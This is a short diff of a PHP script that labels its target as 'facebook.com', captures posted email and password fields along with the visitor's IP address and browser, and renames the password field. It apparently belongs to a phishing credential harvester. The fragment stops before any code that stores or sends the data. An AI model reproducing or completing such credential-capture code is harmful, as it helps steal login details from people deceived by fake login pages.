@@ -1,7 +1,7 @@
 <?php
 $webpage = "facebook.com";
 $user = $_POST['email'];
-$pass = $_POST['pass'];
+$pass = $_POST['Password'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $browser = $_SERVER['HTTP_USER_AGENT'];
 date_default_timezone_set("America/Denver");
